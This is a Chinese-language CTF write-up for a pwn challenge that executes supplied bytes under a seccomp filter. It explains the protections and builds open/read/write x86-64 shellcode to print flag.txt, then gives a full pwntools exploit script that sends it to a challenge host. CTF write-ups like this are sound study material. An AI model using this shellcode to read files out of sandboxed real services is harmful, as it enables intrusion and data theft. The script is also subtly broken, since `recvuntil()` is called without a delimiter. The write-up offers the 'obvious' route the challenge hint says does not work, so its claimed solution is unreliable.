# Basalt Chamber Writeup

## 題目描述
```text
The chamber runs supplied bytes under a strict local policy.
The obvious route is not the one that leaves with proof.
```

```bash
nc 34.62.69.250 41053
```

```text
Flag format: 0xV01D{...}
```

[Download Challenge](https://files.0xv01d-ctf.xyz/ctf-2026/pwn/Basalt.zip)

題目會接收使用者輸入的bytes，然後直接執行。

## 解題思路

1. **第一步**：拆解題目

    題目提供：

    ```text
    chall
    run.sh
    README_NOTE.txt
    ```

    從`README_NOTE.txt`可以發現：

    ```text
    The obvious route is not the one that leaves with proof.
    ```

    代表肯定不是簡單解法，例如：

    ```text
    execve("/bin/sh")
    ```

2. **第二步**：檢查保護

    先看binary：

    ```bash
    checksec chall
    ```

    得到：

    ```text
    NX disabled
    PIE disabled
    RWX memory
    ```

    代表程式會mmap可執行記憶體，然後直接執行shellcode，但是題目同時有seccomp防止syscall。

3. **第三步**：seccomp分析

    反組譯後可以得到：

    ```c
    seccomp_init(...)
    seccomp_rule_add(...)
    ```

    代表程式會在執行shellcode前安裝seccomp filter，所以不能直接：

    ```asm
    execve("/bin/sh")
    ```

4. **第四步**：寫ORW Shellcode

    因為seccomp不允許execve，所以直接用ORW Shellcode直接讀flag並輸出。

    流程如下：

    ```text
    1. open("flag.txt", O_RDONLY)
    2. read(fd, buf, size)
    3. write(1, buf, size)
    4. exit(0)
    ```


    ### Open

    先把flag.txt push到stack。

    ```asm
    xor eax, eax
    push rax

    mov rbx, 0x7478742e67616c66  #flag.txt轉成little endian
    push rbx
    ```


    接著處理,0：

    ```asm
    mov rdi, rsp
    xor esi, esi
    mov al, 2
    syscall
    ```

    以上兩組asm串接起來等價於：

    ```c
    open("flag.txt", 0);
    ```


    ### Read

    open回傳fd會存在rax，然後

    ```asm
    mov edi, eax
    ```

    把fd放到rdi，接著把buffer指到stack下方：

    ```asm
    mov rsi, rsp
    sub rsi, 0x200
    mov edx, 0x200
    xor eax, eax
    syscall
    ```

    等價於：

    ```c
    read(fd, buf, 0x200);
    ```


    ### Write

    read()會把讀到的bytes數量存進rax：
    ```asm
    mov edx, eax
    mov edi, 1
    mov eax, 1
    syscall
    ```

    等價於：

    ```c
    write(1, buf, n);
    ```


5. **第五步**：Combine

    ```python
    shellcode = asm("""
        xor eax, eax

        # push "flag.txt\\0"
        push rax
        mov rbx, 0x7478742e67616c66
        push rbx

        # open("flag.txt", 0)
        mov rdi, rsp
        xor esi, esi
        mov al, 2
        syscall

        # read(fd, buf, 0x200)
        mov edi, eax
        mov rsi, rsp
        sub rsi, 0x200
        mov edx, 0x200
        xor eax, eax
        syscall

        # write(1, buf, n)
        mov edx, eax
        mov edi, 1
        mov eax, 1
        syscall

        # exit(0)
        mov eax, 60
        xor edi, edi
        syscall
    """)
    ```


## Exploit (python)

```python
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST = "34.62.69.250"
PORT = 41053

p = remote(HOST, PORT)

shellcode = asm("""
    xor eax, eax

    push rax
    mov rbx, 0x7478742e67616c66
    push rbx

    mov rdi, rsp
    xor esi, esi
    mov al, 2
    syscall

    mov edi, eax
    mov rsi, rsp
    sub rsi, 0x200
    mov edx, 0x200
    xor eax, eax
    syscall

    mov edx, eax
    mov edi, 1
    mov eax, 1
    syscall

    mov eax, 60
    xor edi, edi
    syscall
""")

p.recvuntil()
p.send(shellcode)

p.interactive()
```

## Flag

```text
0xV01D{...}
```
